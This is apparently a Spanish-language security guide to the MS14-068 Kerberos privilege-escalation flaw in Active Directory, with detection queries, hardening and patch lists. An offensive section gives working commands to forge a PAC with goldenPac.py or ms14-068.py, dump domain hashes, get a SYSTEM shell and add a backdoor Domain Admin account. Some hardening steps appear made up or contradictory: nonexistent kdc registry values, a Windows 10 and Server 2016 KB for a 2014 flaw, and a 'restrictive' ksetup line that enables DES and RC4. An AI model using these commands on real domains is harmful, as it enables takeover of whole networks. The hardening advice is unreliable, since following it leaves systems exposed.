# üõë MS14-068 en Active Directory

---

## üìù ¬øQu√© es MS14-068?

| Concepto      | Descripci√≥n                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definici√≥n**| MS14-068 (CVE-2014-6324) es una vulnerabilidad cr√≠tica en el protocolo Kerberos de Windows que permite a cualquier usuario del dominio obtener privilegios de administrador de dominio mediante la falsificaci√≥n de tickets Kerberos con grupos administrativos. |
| **Requisito** | El atacante necesita credenciales v√°lidas de cualquier usuario del dominio y conectividad de red al KDC (puerto 88). No requiere privilegios especiales iniciales. |

---

## üõ†Ô∏è ¬øC√≥mo funciona el ataque?

| Fase             | Acci√≥n                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **Autenticaci√≥n**| El atacante se autentica con credenciales de usuario v√°lidas contra el KDC.                   |
| **Falsificaci√≥n**| Crea un ticket Kerberos (PAC) falsificado agregando grupos administrativos (Domain Admins, Enterprise Admins). |
| **Validaci√≥n**   | El KDC acepta el ticket falsificado debido a un fallo en la validaci√≥n de la firma digital del PAC. |
| **Escalada**     | Utiliza el ticket privilegiado para acceder a recursos como administrador de dominio.         |
| **Persistencia** | Puede crear nuevas cuentas administrativas, volcar hashes o establecer backdoors permanentes.  |

---

## üíª Ejemplo pr√°ctico ofensivo (comandos reales)

```bash
# Obtener informaci√≥n del usuario actual y dominio
whoami /user
echo %USERDOMAIN%

# Generar ticket falsificado con goldenPac.py (Impacket)
python3 goldenPac.py DOMAIN/user:password@target.domain.com

# Alternativa con exploit espec√≠fico MS14-068
python3 ms14-068.py -u user@domain.com -p password -s S-1-5-21-DOMAIN-SID-1001 -d DC_IP

# Una vez obtenido el ticket privilegiado, usarlo para psexec
psexec.py -k -no-pass DOMAIN/administrator@target.domain.com

# Volcar todos los hashes del dominio con secretsdump
secretsdump.py -k -no-pass DOMAIN/administrator@DC_IP

# Crear nueva cuenta de administrador para persistencia
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain
```

```
[*] Building Kerberos ticket for user: testuser@DOMAIN.COM
[*] SID for user testuser: S-1-5-21-1234567890-0987654321-1122334455-1001
[*] Forging ticket with additional privileged groups...
[*] PAC_LOGON_INFO successfully modified
[*] Ticket saved to ccache file
[+] Golden ticket generated successfully!
[*] Authenticating with forged ticket...
[+] Got SYSTEM shell on target DC!
```

---

## üìä Detecci√≥n en logs y SIEM

| Campo clave                   | Descripci√≥n                                                                 |
|-------------------------------|----------------------------------------------------------------------------|
| **EventCode = 4768**          | Solicitud TGT Kerberos con PAC modificado o grupos an√≥malos.               |
| **EventCode = 4769**          | Solicitud TGS con escalada s√∫bita de privilegios.                          |
| **EventCode = 4624**          | Inicio de sesi√≥n con privilegios administrativos inesperados.              |
| **EventCode = 4672**          | Asignaci√≥n de privilegios especiales a cuenta no administrativa.           |
| **EventCode = 4648**          | Intento de inicio de sesi√≥n con credenciales expl√≠citas.                   |
| **EventCode = 4634**          | Cierre de sesi√≥n con cleanup de tickets Kerberos.                          |

### Query Splunk b√°sica

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=4768 OR EventCode=4769 OR EventCode=4672 OR EventCode=4624)
| where like(Target_User_Name, "*") AND Authentication_Package="Kerberos"
| table _time, Target_User_Name, Client_Address, Service_Name, Result_Code, Privilege_List
```

---

## üîé Queries completas para m√°s investigaci√≥n

### 1. Detecci√≥n de escalada s√∫bita de privilegios

```splunk
index=dc_logs EventCode=4672
| where NOT (SubjectAccountName="SYSTEM" OR SubjectAccountName="LOCAL SERVICE" OR SubjectAccountName="NETWORK SERVICE")
| table _time, SubjectAccountName, Privilege_List, Computer, Source_Network_Address
```

### 2. Tickets Kerberos con grupos administrativos an√≥malos

```splunk
index=dc_logs EventCode=4768 Result_Code=0x0
| where like(Target_User_Name, "*") AND NOT like(Target_User_Name, "*$")
| lookup users_table user_name AS Target_User_Name OUTPUT is_admin
| where is_admin="false"
| table _time, Target_User_Name, Client_Address, Service_Name
```

### 3. Autenticaciones administrativas desde IPs no habituales

```splunk
index=dc_logs EventCode=4624 Logon_Type=3 
| where like(Account_Name, "*admin*") OR like(Account_Name, "*adm*")
| stats count by Source_Network_Address, Account_Name
| where count < 5
```

### 4. Detecci√≥n de uso de goldenPac o herramientas similares

```splunk
index=endpoint_logs (process_name="python.exe" OR process_name="python3.exe")
| where like(command_line, "*goldenPac*") OR like(command_line, "*ms14-068*")
| table _time, host, user, command_line, parent_process
```

### 5. Patrones de acceso post-explotaci√≥n

```splunk
index=dc_logs EventCode=5140 Object_Name="\\*\\ADMIN$" OR Object_Name="\\*\\C$"
| where NOT like(SubjectAccountName, "*$")
| table _time, SubjectAccountName, Object_Name, Source_Network_Address, Computer
```

---

## üõ°Ô∏è Detecci√≥n con Windows Defender for Endpoint

### Reglas de detecci√≥n personalizadas

```kql
// MS14-068 - Detecci√≥n de solicitudes TGS con PAC forjado
DeviceEvents
| where ActionType == "KerberosTgsRequested"
| where AdditionalFields has "ForgedPac" or AdditionalFields has "InvalidSignature"
| project Timestamp, DeviceName, AccountName, AdditionalFields
| order by Timestamp desc
```

```kql
// Detecci√≥n de herramientas MS14-068
DeviceProcessEvents
| where ProcessCommandLine has_any ("ms14-068", "pykek", "goldenPac", "CVE-2014-6324", "kekeo")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detecci√≥n de escalada de privilegios v√≠a Kerberos
DeviceLogonEvents
| where LogonType == "Network"
| where PreviousLogonTime != "" and AccountName !endswith "$"
| join kind=inner (
    DeviceEvents
    | where ActionType == "PrivilegeEscalation"
    | project Timestamp, DeviceName, AccountName
) on DeviceName, AccountName
| where Timestamp1 > Timestamp and Timestamp1 - Timestamp < 10m
| project Timestamp1, DeviceName, AccountName, LogonType
```

### Alertas recomendadas

| Regla | Descripci√≥n | Severidad |
|-------|-------------|-----------|
| **Forged PAC Detection** | Detecci√≥n de PAC forjado en tickets Kerberos | Cr√≠tica |
| **MS14-068 Exploitation Tools** | Herramientas de explotaci√≥n de MS14-068 | Cr√≠tica |
| **Kerberos Privilege Escalation** | Escalada de privilegios v√≠a vulnerabilidades Kerberos | Alta |

---

## ü¶Ö Detecci√≥n con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detecci√≥n de MS14-068 basado en tickets an√≥malos
event_platform=Win event_simpleName=AuthActivityAuditLog
| search ServiceName=krbtgt TicketEncryptionType=*
| bin _time span=5m
| stats count as ticket_requests, dc(UserName) as unique_users by ComputerName, _time
| where ticket_requests > 20 OR unique_users > 10
| sort - ticket_requests
```

```sql
-- Detecci√≥n de herramientas MS14-068
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*ms14-068* OR CommandLine=*pykek* OR CommandLine=*goldenPac* OR FileName=*kekeo*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detecci√≥n de cambios s√∫bitos en privilegios
event_platform=Win event_simpleName=UserLogon
| search LogonType=3 TokenElevationType=*
| bin _time span=2m
| stats count as privilege_changes by ComputerName, UserName, _time
| where privilege_changes > 5
| sort - privilege_changes
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar forjado de tickets Kerberos
event_platform=Win event_simpleName=KerberosTicketRequest
| search TicketFlags=*forged* OR EncryptionType=*invalid*
| stats count by ComputerName, UserName, ServiceName
| where count > 1
```

---

## üîç Queries KQL para Microsoft Sentinel

### Detecci√≥n de MS14-068

```kql
// Query principal para detectar explotaci√≥n MS14-068
SecurityEvent
| where EventID == 4768 // TGT request
| where TargetUserName !endswith "$"
| where ServiceName == "krbtgt"
| summarize TgtRequests = count() by Account, IpAddress, bin(TimeGenerated, 5m)
| where TgtRequests > 10
| join kind=inner (
    SecurityEvent
    | where EventID == 4672 // Special privileges assigned
    | where PrivilegeList has_any ("SeDebugPrivilege", "SeTcbPrivilege", "SeBackupPrivilege")
    | project TimeGenerated, Computer, Account, PrivilegeList
) on Account
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 15m
| project TimeGenerated, Account, IpAddress, TgtRequests, PrivilegeList
```

```kql
// Correlaci√≥n con herramientas de explotaci√≥n
DeviceProcessEvents
| where ProcessCommandLine has_any ("ms14-068", "pykek", "goldenPac")
| join kind=inner (
    SecurityEvent
    | where EventID == 4768 and ServiceName == "krbtgt"
    | project TimeGenerated, Computer, Account, IpAddress
) on $left.DeviceName == $right.Computer
| project TimeGenerated, DeviceName, ProcessCommandLine, Account, IpAddress
```

### Hunting avanzado

```kql
// Detecci√≥n de Golden Ticket posterior a MS14-068
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where Account !endswith "$"
| summarize LogonCount = count(), UniqueComputers = dcount(Computer) by Account, bin(TimeGenerated, 1h)
| where LogonCount > 50 or UniqueComputers > 20
| join kind=inner (
    SecurityEvent
    | where EventID == 4768 and ServiceName == "krbtgt"
    | summarize TgtCount = count() by Account, bin(TimeGenerated, 1h)
    | where TgtCount > 5
) on Account, TimeGenerated
| project TimeGenerated, Account, LogonCount, UniqueComputers, TgtCount
```

```kql
// Detecci√≥n de acceso a objetos cr√≠ticos post-escalada
SecurityEvent
| where EventID == 4662 // Object access
| where ObjectName has_any ("AdminSDHolder", "Domain Admins", "Enterprise Admins")
| join kind=inner (
    SecurityEvent
    | where EventID == 4672 // Special privileges
    | where PrivilegeList has_any ("SeDebugPrivilege", "SeTcbPrivilege")
    | project TimeGenerated, Computer, Account, PrivilegeList
) on Computer, Account
| where TimeGenerated > TimeGenerated1 and TimeGenerated - TimeGenerated1 < 30m
| project TimeGenerated, Computer, Account, ObjectName, PrivilegeList
```

---

## ü¶æ Hardening y mitigaci√≥n

| Medida                                           | Descripci√≥n                                                                                 |
|--------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Parchear inmediatamente**                      | Aplicar KB3011780 (MS14-068) en todos los DCs y servidores del dominio.                   |
| **Monitorizar tickets Kerberos an√≥malos**       | Vigilar eventos 4768/4769 con escaladas s√∫bitas de privilegios.                           |
| **Auditor√≠a de privilegios especiales**         | Habilitar y monitorizar evento 4672 para detectar asignaciones an√≥malas.                  |
| **Validaci√≥n de PAC estricta**                  | Configurar validaci√≥n estricta de PAC en controladores de dominio.                        |
| **Configurar SIEM alertas cr√≠ticas**            | Alertas inmediatas para escaladas de privilegios y uso de tickets privilegiados an√≥malos. |
| **Rotaci√≥n de contrase√±as krbtgt**              | Cambiar contrase√±a de krbtgt para invalidar tickets falsificados existentes.              |

---

## üîß Parches y actualizaciones

| Parche/Update | Descripci√≥n                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB3011780** | Windows Server 2012 R2 - Parche cr√≠tico principal para CVE-2014-6324 (MS14-068).          |
| **KB3011782** | Windows Server 2012 - Correcciones completas del protocolo Kerberos PAC.                   |
| **KB3011784** | Windows Server 2008 R2 - Mitigaci√≥n esencial de falsificaci√≥n de tickets Kerberos.         |
| **KB3011787** | Windows 8.1/10 - Protecci√≥n del cliente contra tickets Kerberos falsificados.              |
| **KB3119884** | Windows Server 2016 - Refuerzo de validaciones PAC y tickets Kerberos.                     |

### Configuraciones de registro post-parche

```powershell
# Habilitar validaci√≥n estricta de PAC
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kdc" -Name "ValidatePAC" -Value 1

# Configurar auditor√≠a detallada de Kerberos
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# Habilitar logging de eventos de privilegios especiales
auditpol /set /subcategory:"Special Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

# Configurar pol√≠tica de Kerberos m√°s restrictiva
ksetup /setenctypeattr DOMAIN DES-CBC-CRC DES-CBC-MD5 RC4-HMAC-MD5 AES128-CTS-HMAC-SHA1-96 AES256-CTS-HMAC-SHA1-96
```

### Verificaci√≥n de aplicaci√≥n de parches

```powershell
# Verificar que el parche MS14-068 est√© instalado
Get-HotFix -Id KB3011780, KB3011782, KB3011784, KB3011787

# Verificar configuraci√≥n PAC post-parche
$kdcConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kdc" -Name "ValidatePAC" -ErrorAction SilentlyContinue
if ($kdcConfig.ValidatePAC -eq 1) {
    Write-Host "‚úì Validaci√≥n PAC configurada correctamente" -ForegroundColor Green
} else {
    Write-Host "‚úó ALERTA: ValidatePAC no configurado" -ForegroundColor Red
}

# Verificar nivel funcional del dominio
Get-ADDomain | Select-Object DomainMode
```

### Script de rotaci√≥n de contrase√±a krbtgt

```powershell
# Rotaci√≥n de contrase√±a krbtgt (ejecutar dos veces con 24h de diferencia)
# PRIMERA ROTACI√ìN
$krbtgt = Get-ADUser -Identity krbtgt
$newPassword = ConvertTo-SecureString -String (([System.Web.Security.Membership]::GeneratePassword(25, 5))) -AsPlainText -Force
Set-ADAccountPassword -Identity $krbtgt -NewPassword $newPassword -Reset
Write-Host "Primera rotaci√≥n de krbtgt completada" -ForegroundColor Yellow

# SEGUNDA ROTACI√ìN (ejecutar 24-48 horas despu√©s)
# $newPassword2 = ConvertTo-SecureString -String (([System.Web.Security.Membership]::GeneratePassword(25, 5))) -AsPlainText -Force
# Set-ADAccountPassword -Identity $krbtgt -NewPassword $newPassword2 -Reset
# Write-Host "Segunda rotaci√≥n de krbtgt completada - Tickets falsificados invalidados" -ForegroundColor Green
```

### Actualizaciones cr√≠ticas de seguridad relacionadas

- **CVE-2014-6324**: MS14-068 falsificaci√≥n PAC Kerberos (KB3011780)
- **CVE-2021-42287**: noPac related Kerberos issues (KB5008102)
- **CVE-2020-17049**: Kerberos KDC validation bypass (KB4586876)
- **CVE-2022-37966**: Kerberos RC4-HMAC vulnerability (KB5021131)

### Configuraci√≥n avanzada de mitigaci√≥n

```powershell
# Script para configuraci√≥n defensiva completa contra MS14-068
# Configurar pol√≠ticas de Kerberos m√°s restrictivas
Set-ADDomainMode -Identity (Get-ADDomain).DistinguishedName -DomainMode Windows2012R2Domain

# Configurar validaciones adicionales de tickets
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kdc" -Name "StrictKerberosValidation" -Value 1

# Habilitar auditor√≠a avanzada espec√≠fica para MS14-068
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable

# Configurar alertas de seguridad para escaladas an√≥malas
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command 'Get-WinEvent -FilterHashtable @{LogName=\"Security\"; ID=4672} -MaxEvents 1 | Send-MailMessage -To admin@domain.com -Subject \"ALERT: Privilegios especiales asignados\"'"
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "MS14068Alert" -Action $taskAction -Trigger $taskTrigger

# Configurar pol√≠ticas de grupo para mitigaci√≥n
# Computer Configuration > Windows Settings > Security Settings > Account Policies > Kerberos Policy
# Maximum lifetime for user ticket: 8 hours
# Maximum lifetime for service ticket: 600 minutes
# Maximum tolerance for computer clock synchronization: 5 minutes
```

### Herramientas de detecci√≥n espec√≠ficas para MS14-068

```powershell
# Script de detecci√≥n de indicadores de MS14-068
$suspiciousPrivileges = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4672} -MaxEvents 100 |
    Where-Object {$_.Message -like "*SeDebugPrivilege*" -or $_.Message -like "*SeTcbPrivilege*"} |
    Where-Object {$_.Properties[1].Value -notlike "*SYSTEM*"}

if ($suspiciousPrivileges) {
    Write-Warning "Posibles indicadores de MS14-068 detectados:"
    $suspiciousPrivileges | Select-Object TimeCreated, @{Name='User';Expression={$_.Properties[1].Value}}
}

# Verificar tickets Kerberos activos con privilegios an√≥malos
klist sessions
klist tickets
```

---

## üßë‚Äçüíª ¬øC√≥mo verificar vulnerabilidad de forma segura?

```bash
# Verificar si el dominio es vulnerable sin explotar
python3 ms14-068-checker.py DOMAIN/user:password@DC_IP

# Verificar aplicaci√≥n de parches
Get-HotFix | Where-Object {$_.HotFixID -like "*3011*"}

# Verificar configuraci√≥n de validaci√≥n PAC
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kdc" | Select-Object ValidatePAC
```

---

## üìö Referencias

- [Microsoft Security Bulletin MS14-068](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068)
- [MS14-068 - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication/ms14-068)
- [PyKEK MS14-068 Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068)
- [Microsoft Kerberos Protocol Extensions](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9)